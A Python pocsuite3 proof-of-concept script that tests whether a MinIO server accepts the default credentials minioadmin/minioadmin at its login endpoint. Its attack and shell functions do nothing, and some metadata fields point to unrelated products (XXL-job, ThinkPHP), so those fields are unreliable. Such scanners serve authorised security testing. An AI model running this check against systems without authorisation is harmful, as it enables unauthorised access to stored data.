"""
作者 charis
时间 2022-12-30
"""

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list


class DemoPOC(POCBase):
    vulID = '10'  # ssvid
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2022-12-30'
    updateDate = '2022-12-30'
    references = ['https://github.com/DawnFlame/POChouse/tree/main/XXLjob']
    name = 'Minio 弱口令检查'
    appPowerLink = 'http://www.thinkphp.cn/'
    appName = 'Minio'
    appVersion = 'Minio all version'
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''Minio 是一个基于Apache License v2.0开源协议的对象存储服务。存在弱口令可获取合法用户的权限，从而能够查看敏感信息操作业务系统。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _check(self, url):
        data = r'{"accessKey":"minioadmin","secretKey":"minioadmin"}'

        payloads = [
            "/api/v1/login"
        ]
        for payload in payloads:
            vul_url = url + payload
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/json"
            }
            try:
                r = requests.post(vul_url, data=data, headers=headers)
                if r.status_code == 204:
                        return payload, data
            except requests.exceptions.RequestException as e:
                pass
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Postdata'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        exit("无需获取shell")

    def _shell(self):
        exit("无需获取shell")


    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
